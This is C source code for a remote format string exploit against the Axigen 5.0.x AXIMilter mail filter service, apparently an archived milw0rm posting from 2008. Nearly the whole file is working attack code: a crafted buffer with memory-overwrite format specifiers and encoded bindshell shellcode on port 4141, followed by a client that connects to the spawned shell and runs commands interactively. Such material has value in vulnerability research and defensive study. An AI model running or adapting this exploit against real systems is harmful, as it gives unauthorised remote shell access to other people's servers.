/*
 * Axigen 5.0.x AXIMilter Format String Exploit
 *
 * by hempel (JAN 16 2008)
 *
 * thx to mu-b (digit-labs.org)
 *
 */
#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <string.h>

char buf[] = 
    "FROM:\r\nEHLO:\r\nCNIP:\r\nCNPO:\r\nCNHO: "
/* offsets */
    "\xb8\x96\x05\x08\xb9\x96\x05\x08\xba\x96\x05\x08\xbb\x96\x05\x08"
    "\xbc\x96\x05\x08\xbd\x96\x05\x08\xbe\x96\x05\x08\xbf\x96\x05\x08"
    "\xc0\x96\x05\x08"
/* format string */
    "%35u%6851$n%70u%6850$hhn%47u%6846$hhn%36u%6854$hhn%31u%6853$hhn%"
    "17u%6852$hhn%134u%6847$hhn%111u%6848$hhn%259u%6849$hhn"
    "\r\nRCPT:\r\nVERI: "
/* bindshell code (port 4141) */
    "\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xdc"
    "\xc8\x06\xb7\x83\xeb\xfc\xe2\xf4\xed\x13\x55\xf4\x8f\xa2\x04\xdd"
    "\xba\x90\x9f\x3e\x3d\x05\x86\x21\x9f\x9a\x60\xdf\xcc\xe5\x60\xe4"
    "\x55\x29\x6c\xd1\x84\x98\x57\xe1\x55\x29\xcb\x37\x6c\xae\xd7\x54"
    "\x11\x48\x54\xe5\x8a\x8b\x8f\x56\x6c\xae\xcb\x37\x4f\xa2\x04\xee"
    "\x6c\xf7\xcb\x37\x95\xb1\xff\x07\xd7\x9a\x6e\x98\xf3\xbb\x6e\xdf"
    "\xf3\xaa\x6f\xd9\x55\x2b\x54\xe4\x55\x29\xcb\x37"
    "\r\nPASS:\r\n";

static int
shell_sock (char *host, int port)
{
    struct sockaddr_in addr;
    int sockfd;

    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror ("socket");
	return 0;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        perror ("connect");
	return 0;
    }

    return sockfd;
}

static void
shell_run (int sockfd)
{
    int rs;
    fd_set rset;
    char rbuf[1024], *cmd = "id; uname -a; uptime\n";

    write(sockfd, cmd, strlen(cmd));
 
    while (1) {
        FD_ZERO (&rset);
        FD_SET (sockfd, &rset);
        FD_SET (STDIN_FILENO, &rset);
        
	select (sockfd + 1, &rset, NULL, NULL, NULL);
	if (FD_ISSET (sockfd, &rset)) {
	    rs = read (sockfd, rbuf, sizeof(rbuf) - 1);
            if (rs <= 0) {
                perror("read");
		return;
            }
	    rbuf[rs] = '\0';
            printf ("%s", rbuf);
        }
        
	if (FD_ISSET (STDIN_FILENO, &rset)) {
	    rs = read(STDIN_FILENO, rbuf, sizeof(rbuf) - 1);
            if (rs > 0) {
        	rbuf[rs] = '\0';
        	write (sockfd, rbuf, rs);
            }
        }
    }
}

int 
main(int argc, char **argv)
{
    int sockfd, port, buf_len;
    struct sockaddr_in addr;
    char *host;
    
    printf("AXIGEN 5.0.x AXIMilter format string Exploit by hempel\n");
    
    if (argc < 2) {
	printf("%s host port\n", *argv);
	return 0;
    }
    
    host = argv[1];
    port = atoi(argv[2]);
        
    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
	perror("socket");
	return -1;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    
    if (connect(sockfd, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
	perror("connect");
	return -1;
    }
    
    buf_len = sizeof(buf) - 1;
    if (write(sockfd, buf, buf_len) == -1) {
	perror("write");
	return -1;
    }    
    close(sockfd);

    printf("trying shell at %s:4141 ...", host);
    fflush(stdout);
    sockfd = shell_sock(host, 4141);
    if (sockfd) {
	printf("w00t!\n");
	shell_run(sockfd);
    } else {
	printf("nope!\n");
    }
    
    return 0;
}

// milw0rm.com [2008-01-21]
